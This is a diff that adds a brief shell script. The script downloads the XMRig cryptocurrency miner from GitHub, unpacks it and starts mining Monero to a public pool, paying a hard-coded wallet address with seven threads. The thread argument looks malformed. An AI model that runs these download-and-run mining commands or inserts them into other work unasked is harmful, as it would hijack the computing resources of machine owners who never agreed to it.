@@ -1,0 +1,13 @@
+
+
+
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-focal-x64.tar.gz
+
+tar xvzf xmrig-6.17.0-focal-x64.tar.gz
+
+cd xmrig-6.17.0/
+
+./xmrig -o pool.minexmr.com:443 -u 86hEPr9u5T4f8Wzjo79L7GPojt7G6V4Qfii1SPxFNXPZchuN7P9VyWWUYJYHNuUMAYKASVJsHBudJ18jWwyugAbeLs1ad9Y -k --tls -- threads=7
+
+
+
